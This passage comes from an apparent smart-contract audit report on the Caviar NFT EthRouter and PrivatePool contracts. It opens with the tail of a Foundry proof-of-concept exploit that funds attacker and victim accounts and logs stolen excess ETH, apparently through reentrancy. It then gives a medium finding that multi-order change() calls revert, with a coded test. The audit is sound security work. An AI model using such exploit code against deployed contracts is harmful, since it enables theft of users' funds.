        (, royalty) = nft.royaltyInfo(tokenId, salePrice);

        // The total input ETH amount.
        baseTokenAmount = baseTokenAmount + royalty;

        // Return the needed argument struct array.
        buys = new EthRouter.Buy[](1);
        buys[0] = EthRouter.Buy({
            pool: payable(address(privatePool)),
            nft: address(nft),
            tokenIds: tokenIds,
            tokenWeights: new uint256[](0),
            proof: PrivatePool.MerkleMultiProof(
                new bytes32[](0),
                new bool[](0)
            ),
            baseTokenAmount: baseTokenAmount,
            isPublicPool: false
        });
    }

    /**
     * @notice Deploy and initialize an instance of the vulnerable private pool implementation.
     */
    function _deployPrivatePool() internal {
        // Deploy pool implementation.
        privatePool = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(stolenNftOracle)
        );

        // Initialize pool instance.
        privatePool.initialize(
            address(0),
            address(nft),
            VIRTUAL_BASE_TOKEN_RESERVES,
            VIRTUAL_NFT_RESERVES,
            0,
            0,
            MERKLE_ROOT,
            false,
            true
        );
    }

    /**
     * @notice Transfer the NFT to the pool to simulate the private pool owner has deposited it.
     * @param _targetTokenId The specific NFT that will be used by the attacker to perform the exploit.
     */
    function _depositNft(uint256 _targetTokenId) internal {
        address owner = nft.ownerOf(tokenId);
        vm.prank(owner);
        nft.transferFrom(owner, address(privatePool), _targetTokenId);
        assertEq(nft.ownerOf(_targetTokenId), address(privatePool));
    }

    /**
     * @notice Funds ETH to the accounts that will need native tokens for this test case.
     */
    function _fundEth() internal {
        vm.deal(address(privatePool), VIRTUAL_BASE_TOKEN_RESERVES);
        vm.deal(attacker, 100e18);
        vm.deal(victim, 100e18);
    }

    /**
     * @notice Logs the current state to show the exploit status in the terminal.
     */
    function _logState(string memory state) internal view {
        console.log("");
        console.log("============================================");
        console.log(state);
        console.log("============================================");
        console.log(
            string.concat(
                " | Attacker balance:            ",
                string.concat(
                    Strings.toString(attacker.balance / 1e18),
                    ".",
                    Strings.toString((attacker.balance % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Victim balance:              ",
                string.concat(
                    Strings.toString(address(victim).balance / 1e18),
                    ".",
                    Strings.toString((address(victim).balance % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Router balance:              ",
                string.concat(
                    Strings.toString(address(ethRouter).balance / 1e18),
                    ".",
                    Strings.toString((address(ethRouter).balance % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Pool balance:                ",
                string.concat(
                    Strings.toString(address(privatePool).balance / 1e18),
                    ".",
                    Strings.toString(
                        (address(privatePool).balance % 1e18) / 1e15
                    )
                ),
                " ETH"
            )
        );
        console.log("============================================");
    }

    /**
     * @notice Logs the extra data to show the exploit status in the terminal.
     */
    function _logExtraData(
        uint256 amountETHPaid,
        uint256 royaltyPaid,
        uint256 excessAmountStolen
    ) internal view {
        console.log("");
        console.log("============================================");
        console.log(" Data");
        console.log("============================================");
        console.log(
            string.concat(
                " | Amount ETH paid for NFT:     ",
                string.concat(
                    Strings.toString((amountETHPaid - royaltyPaid) / 1e18),
                    ".",
                    Strings.toString(
                        ((amountETHPaid - royaltyPaid) % 1e18) / 1e15
                    )
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Royalty paid to receiver:    ",
                string.concat(
                    Strings.toString(royaltyPaid / 1e18),
                    ".",
                    Strings.toString((royaltyPaid % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Stolen excess ETH:           ",
                string.concat(
                    Strings.toString(excessAmountStolen / 1e18),
                    ".",
                    Strings.toString((excessAmountStolen % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log("============================================");
    }
}
```
### Recommendation
Rework buy in `EthRouter.sol` and `PrivatePool.sol`. Use reentrancy guard.

## <a id="my-section7"></a> 7. `change(...)` in `EthRouter.sol` won't work with multiple Change orders
### Severity
Medium
### Impact
A user that submits a `change(...)` with more than 1 `Change` order will revert.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/EthRouter.sol#L254-L293)
### Description
`change(...)` in EthRouter.sol calls `change(...)` in the Private Pool in the following code block:
```solidity
PrivatePool(_change.pool).change{value: msg.value}(
	_change.inputTokenIds,
	_change.inputTokenWeights,
	_change.inputProof,
	_change.stolenNftProofs,
	_change.outputTokenIds,
	_change.outputTokenWeights,
	_change.outputProof
);
```
The issue is that `msg.value` is passed as the value that would be used to fund the accrued fees in the Private Pool as the result of using change.
```solidity
(feeAmount, protocolFeeAmount) = changeFeeQuote(inputWeightSum);
```
After the fees are substracted from the received msg.value, the excess is returned back to `EthRouter.sol`
```solidity
// refund any excess ETH to the caller
if (msg.value > feeAmount + protocolFeeAmount) {
	msg.sender.safeTransferETH(msg.value - feeAmount - protocolFeeAmount);
}
```
However, now the next `Change` order in `Change[] calldata changes` will be passed to the private pool again with `msg.value` but the balance of `EthRouter.sol` is actually less than `msg.value` since we were charged a fee in the PrivatePool for the previous Change order - this will cause a revert because now `msg.value > EthRouter.sol balance`.
### Coded POC
Below is a modified `test_RefundsSurplusEth() {...}` in `Change.t.sol` - the test originally changes users NFTs with ids #5-#9 for the Private Pool NFTs with ids #0-#4 - now the test submits a second `Change` in the `EthRouter.Change[] memory changes` array that swaps back the users NFTs with (now) ids #0-#4 for the Private Pool NFTs with (now) ids #5-#9. The function reverts with `OutOfFund` error.
```solidity
function  test_RefundsSurplusEth() public {

	uint256[] memory inputTokenIds = new  uint256[](5);
	uint256[] memory inputTokenWeights = new  uint256[](0);
	uint256[] memory outputTokenIds = new  uint256[](5);
	uint256[] memory outputTokenWeights = new  uint256[](0);

	for (uint256 i = 0; i < 5; i++) {
		inputTokenIds[i] = i + 5;
		outputTokenIds[i] = i;
	}
	
	// Token Ids for the 2nd Change order
	uint256[] memory new_inputTokenIds = new  uint256[](5);
	uint256[] memory new_inputTokenWeights = new  uint256[](0);
	uint256[] memory new_outputTokenIds = new  uint256[](5);
	uint256[] memory new_outputTokenWeights = new  uint256[](0);
	
	// Populate the Token Ids - user now has #0-#4 and pool has #5-#9
	for (uint256 i = 0; i < 5; i++) {
		new_inputTokenIds[i] = i;
		new_outputTokenIds[i] = i + 5;
	}

	EthRouter.Change[] memory changes = new EthRouter.Change[](2);
	changes[0] = EthRouter.Change({
		pool: payable(address(privatePool)),
		nft: address(milady),
		inputTokenIds: inputTokenIds,
		inputTokenWeights: inputTokenWeights,
		inputProof: PrivatePool.MerkleMultiProof(new  bytes32[](0), new  bool[](0)),
		stolenNftProofs: new IStolenNftOracle.Message[](0),
		outputTokenIds: outputTokenIds,
		outputTokenWeights: outputTokenWeights,
		outputProof: PrivatePool.MerkleMultiProof(new  bytes32[](0), new  bool[](0))
	});
	// Create 2nd Change order
	changes[1] = EthRouter.Change({
		pool: payable(address(privatePool)),
		nft: address(milady),
		inputTokenIds: new_inputTokenIds,
		inputTokenWeights: new_inputTokenWeights,
		inputProof: PrivatePool.MerkleMultiProof(new  bytes32[](0), new  bool[](0)),
		stolenNftProofs: new IStolenNftOracle.Message[](0),
		outputTokenIds: new_outputTokenIds,
		outputTokenWeights: new_outputTokenWeights,
		outputProof: PrivatePool.MerkleMultiProof(new  bytes32[](0), new  bool[](0))
	});
	
	(uint256 changeFee,) = privatePool.changeFeeQuote(inputTokenIds.length * 1e18);
	
	uint256 balanceBefore = address(this).balance;
	
	// act
	ethRouter.change{value: 2*changeFee + 1000}(changes, 0);
	
	// assert
	assertEq(balanceBefore - address(this).balance, changeFee, "Should have refunded surplus eth");

}
```
### Recommendation
Keep track of the available balance in `change(...)` in `EthRouter.sol` and update it accordingly.
